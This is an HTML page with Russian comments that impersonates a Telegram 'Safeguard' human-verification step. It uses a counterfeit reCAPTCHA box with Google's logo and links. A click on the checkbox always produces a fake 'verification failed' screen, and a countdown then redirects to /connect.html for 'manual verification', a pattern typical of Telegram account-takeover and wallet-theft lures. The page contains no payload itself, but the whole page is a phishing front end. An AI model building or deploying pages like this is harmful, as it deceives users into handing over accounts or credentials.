<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Safeguard Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
  <!-- Иконки, если нужны -->
  <link
    rel="stylesheet"
    href="https://use.fontawesome.com/releases/v5.0.0/css/all.css"
  />

  <style>
    /****************************************
     *          ГЛОБАЛЬНЫЕ СТИЛИ            *
     ****************************************/
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background-color: #1c1c1c;
      background-image: url('static/background-pattern.jpg');
      background-repeat: no-repeat;
      background-size: cover;
      color: #fff;
    }
    .header {
      width: 100%;
      background-color: #2c2c2c; /* Синий фон */
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 20px;
      box-sizing: border-box;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .header-logo {
      width: 36px;
      height: 36px;
      background: url('static/telegram-icon.png') no-repeat center/contain; /* Иконка Telegram */
    }

    .header h1 {
      margin: 0;
      font-size: 20px;
      color: #fff; /* Белый текст */
      font-family: 'Arial', sans-serif;
    }

    .header-right {
      display: none; /* Скрываем кнопку VERIFY */
    }

    .verify-btn {
      padding: 8px 20px;
      font-size: 16px;
      background-color: #005f99;
      border: none;
      border-radius: 5px;
      color: #fff;
      cursor: pointer;
    }

    /****************************************
     *       "КАРТОЧКА" В ЦЕНТРЕ            *
     ****************************************/
    .verification-card {
      max-width: 450px;
      margin: 60px auto;
      padding: 30px;
      background-color: #2c2c2c;
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
      text-align: center;
    }
    .verification-card .logo {
      margin-bottom: 20px;
    }
    .verification-card .logo img {
      width: 100px;
      height: 100px;
      display: block;
      margin: 0 auto;
    }
    .verification-card h2 {
      font-size: 26px;
      font-weight: bold;
      margin-bottom: 15px;
    }
    .verification-card p {
      font-size: 16px;
      color: #ccc;
      margin-bottom: 25px;
    }
    .powered-by {
      margin-top: 20px;
      font-size: 14px;
    }
    .powered-by a {
      color: #00aaff;
      text-decoration: none;
    }
    .powered-by a:hover {
      text-decoration: underline;
    }

    /****************************************
     *     «БЕЛАЯ» КАПЧА (стиль reCAPTCHA)  *
     ****************************************/
    .captcha-box {
      width: 302px;  /* ширина максимально похожа на реCAPTCHA */
      height: 78px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      position: relative;
      margin: 0 auto;
    }
    /* Чекбокс ~28×28 */
    .checkbox-area {
      position: absolute;
      top: 22px;
      left: 14px;
      width: 28px;
      height: 28px;
      overflow: hidden;
    }
    .checkbox {
      width: 100%;
      height: 100%;
      border: 2px solid #c1c1c1;
      border-radius: 2px;
      background-color: #fff;
      cursor: pointer;
      transition:
        width 400ms,
        height 400ms,
        opacity 400ms,
        border-radius 400ms;
    }
    .checkbox:hover {
      border-color: #b2b2b2;
    }

    /* Спиннер (20px) */
    .spinner {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 20px;
      height: 20px;
      border: 2px solid rgba(0, 0, 0, 0.1);
      border-top: 2px solid #333;
      border-radius: 50%;
      visibility: hidden;
      opacity: 0;
      transition: opacity 0.4s;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }

    /* "I'm not a robot" */
    .im-not-a-robot {
      position: absolute;
      top: 25px;
      left: 50px;
      font-size: 16px;
      color: #000;  /* чёрный текст */
      margin: 0;
      font-family: Arial, sans-serif;
    }

    /* reCAPTCHA logo */
    .captcha-logo {
      position: absolute;
      top: 14px;
      right: 12px;
      width: 38px;
      height: 40px;
    }

    /* Privacy - Terms */
    .captcha-privacy {
      position: absolute;
      bottom: 5px;
      right: 12px;
      font-size: 9px;
      color: #555;
      margin: 0;
      text-align: right;
      font-family: Arial, sans-serif;
    }
    .captcha-privacy a {
      color: #555;
      text-decoration: none;
    }
    .captcha-privacy a:hover {
      text-decoration: underline;
    }

    /****************************************
     *         ЭКРАН ОШИБКИ (скрытый)       *
     ****************************************/
    #failure-stage {
      max-width: 450px;
      margin: 60px auto;
      padding: 30px;
      background-color: #2c2c2c;
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(0,0,0,0.8);
      text-align: center;
      display: none; /* скрыт по умолчанию */
    }
    #failure-stage .logo img {
      width: 100px;
      height: 100px;
      display: block;
      margin: 0 auto 20px auto;
    }
    #failure-stage h2 {
      font-size: 26px;
      font-weight: bold;
      color: #ff4444;
      margin-bottom: 20px;
    }
    #failure-stage p {
      font-size: 16px;
      color: #ccc;
      margin-bottom: 20px;
    }

    /* ======== ФУТЕР ======== */
    .footer {
      text-align: center;
      font-size: 14px;
      color: #aaaaaa;
      padding: 10px;
    }
    .footer img {
      width: 40px;
      height: 30px;
      vertical-align: middle;
    }
  </style>
</head>
<body>

  <!-- Шапка -->
  <div class="header">
    <div class="header-left">
      <div class="header-logo"></div>
      <h1>Telegram</h1>
    </div>
    <div class="header-right"></div> <!-- Эта часть скрыта -->
  </div>

  <!-- Карточка (капча) -->
  <div class="verification-card" id="captcha-stage">
    <div class="logo">
      <img src="static/shield.png" alt="Shield">
    </div>
    <h2>Human Verification</h2>
    <p>Verify your user authenticity by completing the captcha below.</p>

    <!-- БЕЛАЯ капча (похоже на реCAPTCHA) -->
    <div class="captcha-box">
      <div class="checkbox-area">
        <button type="button" id="checkbox" class="checkbox"></button>
        <img id="spinner" class="spinner" alt="">
      </div>
      <p class="im-not-a-robot" style="color:#000; z-index:9999; font-size:20px; top:25px;">I'm not a robot </p>
      <img
        src="https://www.drupal.org/files/issues/2022-09-23/recaptcha-project-browser-transparent.png"
        class="captcha-logo"
        alt="reCAPTCHA"
      >
      <p class="captcha-privacy" style="font-size:9px; position:absolute; right:5px; bottom:-14px;">
        <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a>
        -
        <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
      </p>
    </div>

    <p class="powered-by">
      Powered by: <a href="https://t.me/SafeguardsAuthenticationBot">@Safeguard</a>
    </p>
  </div>

  <!-- Экран ошибки -->
  <div id="failure-stage">
    <div class="logo">
      <img src="static/shield.png" alt="Shield">
    </div>
    <h2>Verification Failed &#10060;</h2>
    <p>Reason: reCAPTCHA timeout.</p>
    <p>You will be redirected to a manual verification in <span id="countdown">5</span> seconds...</p>
  </div>

  <!-- Футер -->
  <div class="footer">
    <p>@SafeguardsAuthenticationBot</p>
    <img src="static/flag-uk.png" alt="English" width="24" height="16">
  </div>

  <script>
    // Находим элементы
    const checkboxBtn = document.getElementById('checkbox');
    const spinner = document.getElementById('spinner');
    const captchaStage = document.getElementById('captcha-stage');
    const failureStage = document.getElementById('failure-stage');
    const countdownSpan = document.getElementById('countdown');
    let countdownValue = 5;

    // Клик по чекбоксу
    if (checkboxBtn) {
      checkboxBtn.addEventListener('click', function(e) {
        e.preventDefault();
        // Сжимаем чекбокс
        checkboxBtn.style.width = '0px';
        checkboxBtn.style.height = '0px';
        checkboxBtn.style.opacity = '0';
        checkboxBtn.style.borderRadius = '50%';

        // Показываем спиннер
        spinner.style.visibility = 'visible';
        spinner.style.opacity = '1';

        // Через 1 секунду -> переходим на экран "ошибка"
        setTimeout(() => {
          showFailureStage();
        }, 1000);
      });
    }

    // Показываем Failure
    function showFailureStage() {
      // Прячем капчу
      captchaStage.style.display = 'none';
      // Прячем спиннер
      spinner.style.opacity = '0';
      setTimeout(()=>{
        spinner.style.visibility = 'hidden';
      }, 400);

      // Показываем failure-stage
      failureStage.style.display = 'block';
      startRedirectCountdown();
    }

    // Таймер 5 секунд
    function startRedirectCountdown() {
      let timer = setInterval(()=>{
        countdownValue--;
        if(countdownSpan) {
          countdownSpan.textContent = countdownValue;
        }
        if(countdownValue <= 0) {
          clearInterval(timer);
           window.location.href = '/connect.html';
        }
      }, 1000);
    }
  </script>
</body>
</html>
